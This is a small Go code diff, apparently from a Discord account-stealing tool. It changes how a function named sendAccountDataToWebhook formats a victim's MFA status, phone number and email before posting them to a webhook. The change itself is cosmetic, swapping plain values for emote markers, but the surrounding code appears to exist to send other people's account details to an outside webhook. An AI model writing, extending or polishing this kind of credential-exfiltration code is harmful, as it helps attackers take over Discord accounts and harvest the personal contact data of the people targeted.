@@ -7,7 +7,6 @@ import (
 	"fmt"
 	"io"
 	"net/http"
-	"strconv"
 )
 
 // I know this is a lot of structs, but basically
@@ -85,16 +84,16 @@ func sendAccountDataToWebhook(account DiscordAccount, webhookUrl string) (err er
 					},
 					{
 						Name:	"MFA",
-						Value:	strconv.FormatBool(account.MFAEnabled),
+						Value:	boolToEmote(account.MFAEnabled),
 					},
 					{
 						Name:	"Phone",
-						Value:	account.Phone,
+						Value:	nullStringEmote(account.Phone),
 						Inline:	true,
 					},
 					{
 						Name:	"Email",
-						Value:	account.Email,
+						Value:	nullStringEmote(account.Email),
 						Inline:	true,
 					},
 				},
